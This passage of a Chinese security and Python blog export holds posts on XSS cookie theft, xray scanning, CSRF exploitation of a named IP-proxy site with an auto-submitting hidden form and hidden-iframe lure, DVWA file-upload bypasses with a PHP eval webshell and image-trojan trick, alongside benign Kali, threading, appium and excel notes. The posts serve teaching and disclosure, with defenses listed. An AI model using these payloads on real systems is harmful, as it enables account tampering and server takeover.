把编辑好的文章发布 得到一个分享链接，将文章链接分享其他用户，等待对方打开阅读https://www.xxxxx.com/asd1/note/1682115 对方阅读后在服务器可以立即看到 cookie 信息，将 cookie 复制出来替换到浏览器，刷新页面，成功登陆受害者账号 搭配 XSS 平台可以更方便的获取更多用户信息，已经提交漏洞，不再深入去利用。 修复 深度过滤敏感标签、函数、和事件，包括他们的编码绕过等(包括但不限于)&lt;img&gt;、&lt;script&gt;、&lt;iframe&gt;、alert()、prompt()、confirm()、onclick事件、onerror事件、onmouseover事件等 cookie 设置 httponly","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"xray 扫描器的使用(一)","slug":"xray 扫描器的使用(一)","date":"2020-03-22T04:00:00.000Z","updated":"2020-03-28T01:52:06.809Z","comments":true,"path":"2020/03/22/xray 扫描器的使用(一)/","link":"","permalink":"http://yoursite.com/2020/03/22/xray%20%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8(%E4%B8%80)/","excerpt":"","text":"xray 是从长亭洞鉴核心引擎中提取出的社区版漏洞扫描神器，支持主动、被动多种扫描方式，自备盲打平台、可以灵活定义 POC，功能丰富，调用简单，支持 Windows / macOS / Linux 多种操作系统。 0x00 xray 扫描器的特色 使用 go 语言编写，跨平台、纯异步、无阻塞，并发能力强，扫描速度快 提供多种使用方式，调用姿势方便，输入输出非常标准化，极具可集成性 使用 YAML 配置文件非常方便地定义 POC，可以快速扩展扫描能力 全程使用无害 POC 进行探测，在确保能发现漏洞的基础上不会给业务带来严重影响，非常适用于企业内部安全建设 命令行式的免费被动扫描工具，不多见 自备盲打平台，可检测需要反连才能触发的漏洞，如：存储型 XSS、无回显的 SSRF、XXE、命令注入等 0x01 下载 GitHub：https://github.com/chaitin/xray 下载地址：https://github.com/chaitin/xray/releases 官方文档：https://xray.cool/xray/#/ 下载系统对应的版本直接在本地运行即可，例如 windows 版本的下载解压后在命令行执行目录内的 xray_windows_386.exe 文件 0x02 安装证书检测 HTTPS 的网站需要安装证书，xray 解压目录自带了证书 ca.crt，双击安装或者在浏览器内导入 (Firefox 浏览器只能在浏览器内导入证书) 也可以使用命令生成新的证书 1xray_windows_386.exe genca 0x03 基础用法爬虫自动扫描1xray_windows_386.exe webscan --basic-crawler http:&#x2F;&#x2F;www.baidu.com 被动扫描1.开启 xray 服务，设置监听端口、输出的报告 1xray_windows_386.exe webscan --listen 127.0.0.1:7777 --html-output test.html 2.浏览器启用代理，端口与 xray 一致 (此处是以火狐浏览器 FoxyProxy 代理插件为例) 3.手动在网页上进行操作，请求就会自动被 xray 捕获，并且自动检测漏洞，检测到的漏洞在命令行中显示红色，同时会生成一个 html格式的漏洞报告 在报告文件中点击漏洞所在的行可以查看漏洞详情 0x04 配置信息xray 目录下的 config.yaml 文件包含了所有的配置信息，配置主要是六个大类 plugins log mitm basic_crawler reverse http 以下是几个常用的可能需要手动修改的配置 1. 设置允许扫描的域名配置文件中 includes 默认 - &#39;*&#39;，表示浏览器上所有访问的网站都会扫描检测，为了便于调试需要修改为仅扫描某个或某些网站。includes: 是允许扫描的域名，excludes: 是不允许扫描的域名，可以使用星号匹配 1234567mitm: restriction: includes: # 允许扫描的域，此处无协议 - &#39;example.com&#39; # 表示允许扫描 example.com - &#39;*.example.com&#39; # 表示允许扫描 *.example.com 所有子域名 excludes: - &#39;a.example.com&#39; # 表示不扫描 a.example.com 2. 为代理添加认证添加用户名密码后，在使用浏览器时就需要填写认证信息 1234mitm: auth: username: &quot;admin&quot; password: &quot;password&quot; 3. 扫描插件配置插件配置修改主要是开启和关闭，默认是全部开启，扫描时检测全部类型的漏洞，不需要检测的漏洞类型修改为 false 123456789plugins: xss: enabled: true # 检测 xss ie_feature: false include_cookie: false cmd_injection: enabled: false # 不检测命令注入 detect_blind_injection: false ... 检测漏洞类型也可以不修改配置信息，在命令行开启 xray 的时候使用 --plugins 参数指定即可，多个插件之间用逗号分隔，扫描漏洞的时候就只会扫描这几种漏洞类型 1xray_windows_386.exe webscan --listen 127.0.0.1:7777 --plugins xss,xxe,cmd_injection 4. 发包速率限制防止请求太快被 waf 拦截，可以将每秒请求数减小，默认每秒 500 12http: max_qps: 10 # 每秒最大请求数 5. 扫描代理配置设置代理可以与 burp suite 等其他软件联动使用 12http: proxy: &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot; # 漏洞扫描时使用的代理 0x05 xray 与 burp suite 联动使用1. burp suite 作为 xray 的上游代理(抓取 xray 发包) 2. xray 作为 burp suite 的上游代理(协助测试)","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"Web安全 - CSRF（跨站请求伪造）","slug":"Web安全 - CSRF（跨站请求伪造）","date":"2020-01-11T04:00:00.000Z","updated":"2020-04-12T10:34:01.485Z","comments":true,"path":"2020/01/11/Web安全 - CSRF（跨站请求伪造）/","link":"","permalink":"http://yoursite.com/2020/01/11/Web%E5%AE%89%E5%85%A8%20-%20CSRF%EF%BC%88%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%89/","excerpt":"","text":"什么是 CSRFCSRF 漏洞是利用已经登陆的用户，在用户不知情的状况下，以用户的名义进行非法操作，例如恶意评论、发帖、点赞、转账等。 漏洞背景这是我在某售卖 IP 代理的网站的个人中心页面，测试过程中发现这里有几个接口是存在 CSRF 漏洞的。比如下图中的修改配置，这是一个post请求，只有两个参数，分别对应过滤的天数和过滤模式，没有其他的校验参数。 再通过抓包修改请求头，将请求头中的 referer 字段删除，仍然能够请求并成功修改配置，说明 referer 也没有校验。这就留下了一个明显的 CSRF 漏洞。 验证利用漏洞下面模拟攻击者的角度验证漏洞的利用过程。 新用户默认过滤天数是1，过滤模式是严格模式，我们恶意代码为了区分结果，将过滤天数设置为3，过滤模式为智能模式 首先新建一个 csrf1.html 文件，在 body 内编辑一个 form 表单，action 的路径就是这个修改配置的接口地址。为了使得攻击的过程隐秘不被发现，将 input 标签的类型都设置为隐藏不展示。 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=\"en\" dir=\"ltr\"&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=\"https://www.apeyun.com/user/user/config\" method=\"post\" id=\"transferForm\" name=\"form1\"&gt; &lt;input type=\"hidden\" name=\"filter_duration\" value=\"3\"&gt; &lt;input type=\"hidden\" name=\"filter_mode\" value=\"2\"&gt; &lt;/form&gt; &lt;/body&gt; &lt;script&gt; &lt;!-- 一打开页面直接自动提交表单 --&gt; document.form1.submit(); &lt;/script&gt;&lt;/html&gt; 然后受害者使用登陆了此网站的浏览器打开创建的 HTML 文件（这里是我注册的测试账号），直接返回了配置成功。刷新原页面，可以看到受害者的配置被修改成了 csrf1.html 中的内容，漏洞已经利用成功。 真实的攻击场景一般不会把恶意脚本文件发送到受害者本地，那样太麻烦了，且 form 表单提交时浏览器有明显的跳转过程和返回信息，容易被受害者察觉。继续来隐藏攻击过程：创建一个 csrf2.html 文件, img 标签设置一个任意图片，iframe 标签设置为隐藏，通过 src 属性跳转到上一步创建的 csrf1.html 文件。 1234567891011&lt;!DOCTYPE html&gt;&lt;html lang=\"en\" dir=\"ltr\"&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;img src=\"https://www.wshangw.net/uploads/allimg/200104/1-2001041006390-L.png\"&gt; &lt;iframe src=\"csrf1.html\" style=\"display:none;\"&gt;&lt;/iframe&gt; &lt;/body&gt;&lt;/html&gt; 在我的测试服务器开启 HTTP 服务，把这两个文件放到服务器，将 csrf2.html 文件地址发送给受害者，配合一些诱导性的话语骗取受害人的信任去点击链接。例如： 当他点击链接以后，无论二维码是不是他的已经不重要了，因为攻击行为已经成功，在受害者完全无感觉的情况下。 受害者的浏览器刷新页面，可以看到配置已经被修改 个人中心页面修改调用密钥的接口同样存在 CSRF 漏洞，这个接口的安全度更低，直接使用了 get 请求，并且没有请求参数，只要请求一下这个接口，密钥就会直接修改，前面的漏洞利用方法在这里同样可行，下图gif是演示效果。 不过这个页面修改密码的功能需要用户输入当前正在使用的密码，这就能很好的杜绝攻击者通过 CSRF 直接修改受害者的密码，因为攻击者此时无法猜测用户的当前密码，自然无法构造请求。 CSRF 漏洞的防御 校验 Referer 请求中加入随机 Token 验证码（会牺牲用户体验） 限制 session 寿命周期（使用户不要长时间保持登陆态，缓解csrf）","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"Web安全 - 文件上传漏洞","slug":"Web安全 - 文件上传漏洞","date":"2019-12-18T04:00:00.000Z","updated":"2020-04-12T10:38:20.611Z","comments":true,"path":"2019/12/18/Web安全 - 文件上传漏洞/","link":"","permalink":"http://yoursite.com/2019/12/18/Web%E5%AE%89%E5%85%A8%20-%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"什么是文件上传漏洞由于管理员在代码编写、环境配置、权限管理等方面的疏忽，用户在客户端能够上传脚本文件，并且有权限在服务器执行，就会导致文件上传漏洞，攻击者可以上传木马、webshell 等恶意脚本，获取服务器权限、敏感信息，危害很大。 下面文章通过开源的 DVWA 渗透测试环境为例，来模拟文件上传漏洞的利用过程，DVWA 靶机的后台是 PHP 语言，其他语言的后台漏洞原理和防御思路都是相通的。DVWA 共有四个等级： low (低安全等级) medium (中安全等级) high (高安全等级) impossible (最高等级) 其中 impossible 等级是最安全的等级，不存在漏洞（我的能力范围内）。 构造脚本在本地创建一个 1.php 文件，内容只有一行，是php一句话木马，也就是简单的webshell。让被攻击的服务器解析此文件，通过 get 方法获取请求参数cmd，并使用 eval 函数来执行。 1&lt;?php eval($_GET[\"cmd\"]);?&gt; 上传文件low 等级登陆 DVWA 环境，进入文件上传模块并上传创建的 1.php 恶意文件，没有任何阻碍，直接上传成功，并且给出了文件保存的路径。 medium 等级按照上一步直接上传，发现上传失败，提示只能上传图片格式的文件 服务器是校验了我们的文件后缀名吗，将 1.php 的文件名修改成 666.png 图片格式尝试一下 可以上传成功，但是通过修改后缀的方式，它并不是一个标准的图片或者php文件，有什么办法可以上传php文件但是不被检测到？ 先正常上传一张图片，观察上传文件的 HTTP 请求，可以看到请求参数中的 Content-Type 是 image/jpeg，medium 安全等级检测就是这个字段。 这里需要通过抓包修改请求了，以 Charles 为例，开启它的请求拦截功能，配置好浏览器代理，选择 1.php 文件并点击上传，请求被 Charles 拦截，当前请求参数中的 Content-Type 值是 application/octet-stream, 把它修改为 image/jpeg 并将修改后的请求放行。 此时前端页面显示上传成功。 这里修改的 Content-Type 实际上是遵循了 MIME 标准, jpe、jpg、jpeg等后缀的文件对应的类型都是 image/jpeg，还可以修改成其他的类型，具体的场景具体分析需要选择哪一种 MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。 更多请查看 MIME 参考手册。 high 等级直接使用前两步的方法进行上传，都不能上传成功，在 high 安全等级下，其实还校验了图片的具体内容，也就是我们上传的文件中如果只有恶意代码肯定会被拦截，绕过方式就是制作图片木马。在本地选择一个 1.jpg 图片文件，和前面创建的 1.php 木马文件结合在一起，生成一个新的 2.jpg 文件。打开cmd命令行在当前路径下执行拼接文件的命令 1copy 1.jpg&#x2F;b+1.php&#x2F;a 2.jpg 这个 2.jpg 文件可以正常双击打开，与普通图片看起来没有什么区别，但是用记事本打开这张图片观察最后面就会发现我们的php代码 直接上传新建的 2.jpg 文件就可以上传成功了。 漏洞利用1. 包含 webshell 木马的 php 文件前面在 low 和 medium 安全等级中都成功上传了 1.php 文件且显示了存储的相对路径，将相对路径填写到当前url的后面并请求，因为它是脚本文件，所以服务器会直接解析，但是发现解析报错了。 原因是还没有传递参数，恶意木马中使用的是 get 请求，参数是 cmd ，所以这里需要在请求url的后面加上参数，如下面几个例子 1.查看 phpinfo 信息 2.查看服务器当前系统用户（通过PHP内置函数执行系统命令） 3.遍历目录 注意：最后面的分号不要忘记，php代码块是以分号结尾。 2. 包含 webshell 木马的图片文件将上传的带有恶意脚本的图片相对路径直接填写到当前url后面并请求，因为是图片文件，所以服务器会将图片展示出来，而不会解析它里面的恶意代码。 按照前面的方法在URL后面加上参数并请求发现服务器没有把它当成脚本来解析，仍然显示的图片本身。如果被攻击服务器的web服务器是 nginx 的话，nginx有一个解析漏洞，就是只要一个请求最后面的后缀名是脚本格式的时候，他就会把整个程序当作脚本来执行。所以我们构造这样的 url 1http:&#x2F;&#x2F;192.168.1.150&#x2F;DVWA-master&#x2F;hackable&#x2F;uploads&#x2F;2.jpg&#x2F;2222.php 前面是图片的地址，后面加上 /xxx.php , xxx 可以随便填写，重要的是要把整个请求最后的后缀名设置成 .php, 然后再加上参数，完整如下 1http:&#x2F;&#x2F;192.168.1.150&#x2F;DVWA-master&#x2F;hackable&#x2F;uploads&#x2F;2.jpg&#x2F;2222.php?cmd&#x3D;phpinfo(); 这样再去请求，服务器就会把我们上传的带有一句话木马的 2.jpg 图片当作脚本来执行，返回结果上面部分的乱码是图片信息，把浏览器滚动条往下拉就能看到参数请求的信息。 3. post webshell如果构造的 webshell 是post请求怎么利用这个漏洞呢 1&lt;?php eval($_POST[\"cmd\"]);?&gt; 上传文件过程是一样的，只是在利用漏洞的时候需要以post的方式提交请求，这里使用 hackbar 插件方便操作 “中国菜刀”上传了 webshell 后，手动在浏览器获取系统敏感信息、遍历目录结构还是很麻烦，并且有一定的运气成分，例如 web服务器是nginx是猜测的，如果是 apache、IIS 的话就得继续猜解尝试其他找漏洞的方法了，”中国菜刀” 这个软件就可以很方便的解决这个问题，只要知道包含webshell木马文件的路径和请求参数即可，剩下的它会自动处理。 打开主页面，右键点击添加，填写webshell地址，参数名等信息并保存 在保存的这条数据右键打开”文件管理”，第一次连接速度比较慢，大概10秒左右，然后就可以看到服务器的目录结构了 也可以在这条数据上右键打开”虚拟终端”，可以在命令行下操作获取信息 文件上传漏洞的防御知道了文件上传漏洞产生的过程和原因，在配置环境和编写代码的时候就可以从以下方面来避免漏洞的产生。 1.检查文件扩展名（防止服务器以非图片格式来解析文件）2.检查文件MIME（例如jpe、jpg、jpeg等后缀的文件对应的类型都是 image/jpeg）3.检测文件内容（防止文件中包含webshell）4.将上传的文件重命名（防止攻击者通过文件名猜解webshell路径）5.存储服务器和业务服务器分离6.图片二次渲染（彻底清除上传文件中包含的webshell）7.尽可能避免文件存储的路径被泄露（例如不要在请求响应中包含上传地址）","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"kali linux 无法上网解决办法","slug":"kali linux无法联网解决办法","date":"2019-11-27T04:00:00.000Z","updated":"2019-11-27T02:33:58.691Z","comments":true,"path":"2019/11/27/kali linux无法联网解决办法/","link":"","permalink":"http://yoursite.com/2019/11/27/kali%20linux%E6%97%A0%E6%B3%95%E8%81%94%E7%BD%91%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/","excerpt":"","text":"新安装的 kali linux 无法连接网络，查看得知 eth0 网卡没有工作。 1. VMware 虚拟机设置 NAT 模式不是虚拟机的话不用管这一步 2. 查看 kali 网络配置1ifconfig -a 可以发现网卡 eth0 没有正常工作，没有配置 IP 3. 修改网络配置文件1vim /etc/network/interfaces 在 interfaces 文件最下方添加这两行 12auto eth0iface eth0 inet dhcp 修改完成后保存退出，并重启系统。此时 ifconfig 命令查看 eth0 网卡已经正常工作，网络连接正常。","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"kali","slug":"kali","permalink":"http://yoursite.com/tags/kali/"}]},{"title":"Python 多线程处理任务 (爬虫为例)","slug":"Python 多线程处理任务 (爬虫为例)","date":"2019-11-05T04:00:00.000Z","updated":"2019-11-05T14:08:03.103Z","comments":true,"path":"2019/11/05/Python 多线程处理任务 (爬虫为例)/","link":"","permalink":"http://yoursite.com/2019/11/05/Python%20%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%A4%84%E7%90%86%E4%BB%BB%E5%8A%A1%20(%E7%88%AC%E8%99%AB%E4%B8%BA%E4%BE%8B)/","excerpt":"","text":"这篇文章主要讲一下使用 Python 的 threading 库进行多线程任务，本文以一个爬虫为例。 爬虫 DEMO下面是一个百度搜索的示例，使用 requests + BeautifulSoup 采集指定关键词指定页数的结果标题。封装的方法接受三个参数，分别是起始页码(int)，结束页码(int)，要搜索的关键词(str)。 123456789101112131415161718def baidu_search(start_num,end_num,keyWord): ''' 采集百度搜索结果的标题 :param start_num: 起始页码 :param end_num: 结束页码 :param keyWord: 搜索的关键词 ''' for i in range(start_num,end_num): url = 'https://www.baidu.com/s?wd=%s&amp;pn=%d'% (keyWord,i*10) headers = &#123; 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36' &#125; r = requests.get(url,headers=headers).text # 获取源码 soup = BeautifulSoup(r,'lxml') # BeautifulSoup 解析 result = soup.select('div.result.c-container &gt; h3 &gt; a') # 通过 css selector 定位查询结果所在元素，返回结果是个列表 for i in result: title = i.text # 通过 .text 方法获取元素内的文本 print(title) 这里不详细介绍采集的代码。 非多线程采集先不使用多线程，直接调用采集函数看一下采集 200 页所用的时间。 123456if __name__ == '__main__': start = time.time() baidu_search(0,200,'python') # 采集0至200页的数据，搜索关键词是 python end = time.time() print('\\n采集总共耗时：' + str(int(end - start)) + ' 秒') 从控制台输出可以看到采集 0-200 页的数据，共耗时 153 秒。 1采集总共耗时：153 秒 多线程采集首先导入 threading 模块。 1import threading 创建一个数组 threads, 添加一个线程 t1，使用 threading.Thread() 方法。target 参数传入的是上面写的百度爬虫的函数 baidu_search，注意方法后面不需要加括号。args 参数传入的是一个数组，依次是baidu_sear函数需要的三个参数 123threads = []t1 = threading.Thread(target=baidu_search,args=(0，100，'python'))threads.append(t1) 同样的方法再创建 t2、t3 两个线程，并装到 threads 数组。仍然是调用baidu_search函数，不过 args 参数的起止页码稍微修改，不要重复采集, 这三个线程采集的页码总数仍然是200页。 1234t2 = threading.Thread(target=baidu_search,args=(100，150，'python'))threads.append(t2)t3 = threading.Thread(target=baidu_search,args=(150，200，'python'))threads.append(t3) 通过 for 循环遍历数组。 123456for t in threads: t.setDaemon(True) # 将线程声明为守护线程，必须在start() 方法调用之前设置，如果不设置为守护线程程序会被无限挂起。 t.start() # 开启线程for t in threads: t.join() # 用于等待线程终止 注：join() 的作用是，在子线程完成运行之前，这个子线程的父线程将一直被阻塞。防止主线程执行完结束，导致子线程也终止。 使用三个线程采集来看一下效果 1采集总共耗时：65 秒 从控制台输出的结果可以看到，三个线程采集 200 页只用了 65 秒 封装多线程如果要开启更多的线程，手动一个个添加就很麻烦了，用函数封装一下。 1234567891011121314151617181920def baidu_dx(all_num,thread_num,keyWord): ''' 多线程采集百度搜索结果的标题 :param all_num: 要采集的总页数 :param thread_num: 要开启的线程数 :param keyWord: 搜索的关键词 ''' per_num = int(all_num / thread_num) # 每个线程处理的任务数量 threads = [] # 开启的线程放到一个列表 for i in range(thread_num): t = threading.Thread(target=baidu_search, args=(i*per_num,i*per_num+per_num,keyWord)) threads.append(t) for t in threads: t.setDaemon(True) t.start() for t in threads: t.join() 调用查看一下效果 12345if __name__ == '__main__': start = time.time() baidu_dx(200,10,'python') # 采集200页的数据，开10个线程，搜索关键词是 python end = time.time() print('\\n采集总共耗时：' + str(int(end - start)) + ' 秒') 1采集总共耗时：23 秒 从控制台输出的结果可以看到，开启 10 个线程采集 200 页只用了 23 秒","categories":[{"name":"爬虫","slug":"爬虫","permalink":"http://yoursite.com/categories/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"爬虫","slug":"爬虫","permalink":"http://yoursite.com/tags/%E7%88%AC%E8%99%AB/"},{"name":"多线程","slug":"多线程","permalink":"http://yoursite.com/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"}]},{"title":"Kali Linux使用SSH远程登陆连接","slug":"kali linix使用SSH远程登陆连接","date":"2019-10-18T04:00:00.000Z","updated":"2019-10-18T11:24:48.696Z","comments":true,"path":"2019/10/18/kali linix使用SSH远程登陆连接/","link":"","permalink":"http://yoursite.com/2019/10/18/kali%20linix%E4%BD%BF%E7%94%A8SSH%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86%E8%BF%9E%E6%8E%A5/","excerpt":"","text":"新安装的 Kali Linux 不能直接使用SSH工具来远程登陆，有些参数需要做以下修改。 修改 sshd_config 文件中的参数命令：vim /etc/ssh/sshd_config将 PermitRootLogin 的注释解除，并将值设置为 yes 将 PasswordAuthentication 的注释解除，并将值设置为 yes 保存并退出vim 开启SSH服务命令：service ssh start 查看 ssh 服务运行状态命令：service ssh status 使用Xshell等工具远程连接kali","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"kali linux","slug":"kali-linux","permalink":"http://yoursite.com/tags/kali-linux/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"appium：默认60秒关闭应用如何解决","slug":"appium：默认60秒关闭应用如何解决","date":"2019-09-18T04:00:00.000Z","updated":"2019-09-19T01:29:39.054Z","comments":true,"path":"2019/09/18/appium：默认60秒关闭应用如何解决/","link":"","permalink":"http://yoursite.com/2019/09/18/appium%EF%BC%9A%E9%BB%98%E8%AE%A460%E7%A7%92%E5%85%B3%E9%97%AD%E5%BA%94%E7%94%A8%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/","excerpt":"","text":"在使用appium做安卓自动化的时候发现如果APP长时间处于一个页面不动APP就会被自动关闭。控制台日志提示info: [debug] We shut down because no new commands came in 查看文档发现appium启动一个应用后的session默认失效时间是60秒，也就是60秒内appium服务没有接收到任何命令就会关闭应用。这个失效时间在启动appium服务时可设置，在启动命令后面直接加--command-timeout 600 1appium --command-timeout 1200 上面命令后面的 1200 单位是秒，也就是将session的默认失效时间设置为20分钟。启动后可以在控制台日志中看到设置的时间","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"自动化","slug":"自动化","permalink":"http://yoursite.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"appium","slug":"appium","permalink":"http://yoursite.com/tags/appium/"}]},{"title":"命令行来执行python + selenium脚本隐藏：DevTools listening on ws...","slug":"python+selenium命令行执行隐藏日志信息","date":"2019-08-31T04:00:00.000Z","updated":"2019-10-08T13:33:39.066Z","comments":true,"path":"2019/08/31/python+selenium命令行执行隐藏日志信息/","link":"","permalink":"http://yoursite.com/2019/08/31/python+selenium%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%89%A7%E8%A1%8C%E9%9A%90%E8%97%8F%E6%97%A5%E5%BF%97%E4%BF%A1%E6%81%AF/","excerpt":"","text":"使用命令行来执行selenium脚本的时候，控制台会显示下面的一条信息。 1DevTools listening on ws:&#x2F;&#x2F;127.0.0.1:5928&#x2F;devtools&#x2F;browser&#x2F;3db254ee-75ba-4ab2-ba24-dcb645ecf27f 想要隐藏只需要在加一个参数即可 1234from selenium import webdriveroptions.add_experimental_option('excludeSwitches', ['enable-logging'])driver = webdriver.Chrome(options=options) 参考来源：stackoverflow 的回答","categories":[{"name":"自动化","slug":"自动化","permalink":"http://yoursite.com/categories/%E8%87%AA%E5%8A%A8%E5%8C%96/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"selenium","slug":"selenium","permalink":"http://yoursite.com/tags/selenium/"}]},{"title":"aiohttp报错 ImportError：cannot import name 'Coroutine'","slug":"aiohttp报错","date":"2019-08-17T04:00:00.000Z","updated":"2019-10-08T13:31:38.356Z","comments":true,"path":"2019/08/17/aiohttp报错/","link":"","permalink":"http://yoursite.com/2019/08/17/aiohttp%E6%8A%A5%E9%94%99/","excerpt":"","text":"今天将之前的IP代理池copy到其他电脑执行的时候报如下错误，可以看出是aiohttp这个库有问题，但是在之前的机器上运行是没有问题的，猜测可能是版本不同导致。 aiohttp 最新版本是3.5.4，根据文档介绍，此版本要求python版本最低是3.5.3。 而我本地的python是3.5.2，通过官网下载新的python安装包，直接覆盖安装即可，之前安装的第三方库不会有影响。","categories":[{"name":"爬虫","slug":"爬虫","permalink":"http://yoursite.com/categories/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"python操作excel设置单元格颜色","slug":"python操作excel表设置单元格颜色","date":"2019-08-06T04:00:00.000Z","updated":"2019-09-11T03:37:02.739Z","comments":true,"path":"2019/08/06/python操作excel表设置单元格颜色/","link":"","permalink":"http://yoursite.com/2019/08/06/python%E6%93%8D%E4%BD%9Cexcel%E8%A1%A8%E8%AE%BE%E7%BD%AE%E5%8D%95%E5%85%83%E6%A0%BC%E9%A2%9C%E8%89%B2/","excerpt":"","text":"之前写过一篇文章介绍python读取和写入excel表 (直达链接)，实际使用中有时候需要对某些单元格设置颜色以突出显示，例如自动化测试中自动将excel表中失败的用例标红。 给单元格设置样式要用到xlutils库的Styles方法，将添加单元格样式与之前的写入excel表结合为如下的方法。 12345678910111213141516171819import xlrd,xlwtfrom xlutils.copy import copyfrom xlutils.styles import Stylesdef write_excel(row,colum,content,colour=False): oldWb = xlrd.open_workbook(PATH, formatting_info=True) newWb = copy(oldWb) pattern = xlwt.Pattern() # Create the Pattern pattern.pattern = xlwt.Pattern.SOLID_PATTERN # May be: NO_PATTERN, SOLID_PATTERN, or 0x00 through 0x12 pattern.pattern_fore_colour = 2 # May be: 8 through 63. 0 = Black, 1 = White, 2 = Red, 3 = Green, 4 = Blue, 5 = Yellow, 6 = Magenta, 7 = Cyan, 16 = Maroon, 17 = Dark Green, 18 = Dark Blue, 19 = Dark Yellow , almost brown), 20 = Dark Magenta, 21 = Teal, 22 = Light Gray, 23 = Dark Gray, the list goes on... style = xlwt.XFStyle() # Create the Pattern style.pattern = pattern # Add Pattern to Style newWs = newWb.get_sheet(0) if colour == False: newWs.write(row, colum, content) else: newWs.write(row, colum, content,style) newWb.save(PATH) 上面例子中有四个参数： row：行，从0开始，0代表的第一行，格式为int colum：列，从0开始，0代表的第一列，格式为int content：要写入表格的内容 colour: 是否添加单元格颜色，默认是False，要添加就设置为True 其中pattern.pattern_fore_colour 设置的数字就是单元格的颜色，不同的数字代表不同的颜色。","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"自动化","slug":"自动化","permalink":"http://yoursite.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"}]},{"title":"自动整理当前Python项目中用到的第三方库并输出requirements文件","slug":"自动整理Python项目中用到的第三方库并输出requirements文件","date":"2019-08-06T04:00:00.000Z","updated":"2019-08-06T12:24:51.837Z","comments":true,"path":"2019/08/06/自动整理Python项目中用到的第三方库并输出requirements文件/","link":"","permalink":"http://yoursite.com/2019/08/06/%E8%87%AA%E5%8A%A8%E6%95%B4%E7%90%86Python%E9%A1%B9%E7%9B%AE%E4%B8%AD%E7%94%A8%E5%88%B0%E7%9A%84%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E5%B9%B6%E8%BE%93%E5%87%BArequirements%E6%96%87%E4%BB%B6/","excerpt":"","text":"安装pipreqs1pip install pipreqs 使用方法直接在CMD命令行用pipreqs + 路径, 例如当前在项目的根目录，命令如下： 1pipreqs .&#x2F; 等待片刻后就会在当前路径下生成requirements文件。 报错处理如果执行上面命令时报错UnicodeDecodeError: &#39;gbk&#39; codec can&#39;t decode byte 0xa1 in position 182: illegal multibyte sequence 